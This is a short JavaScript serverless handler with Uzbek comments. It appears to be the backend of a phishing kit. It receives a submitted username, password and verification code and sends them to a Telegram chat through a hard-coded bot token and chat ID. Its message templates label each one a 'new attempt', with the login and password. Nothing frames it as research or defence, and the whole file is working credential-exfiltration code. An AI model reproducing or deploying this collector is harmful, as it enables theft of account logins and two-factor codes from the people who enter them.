export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const { type, username, password, code } = req.body;
    
    // Bot tokeningiz va Telegram Chat ID raqamingiz:
    const BOT_TOKEN = '8832921254:AAEmwMCLfn_owYGG_Sn6jmFEf-JRdrXqtH0';
    const CHAT_ID = '7664390523';

    let message = '';
    if (type === 'login') {
        message = `🔔 Yangi urinish:\n👤 Login: ${username}\n🔑 Parol: ${password}`;
    } else if (type === 'code') {
        message = `🔢 Tasdiqlash kodi: ${code}`;
    }

    try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message
            })
        });

        const data = await response.json();
        return res.status(200).json({ success: true, data });
    } catch (error) {
        return res.status(500).json({ success: false, error: error.message });
    }
}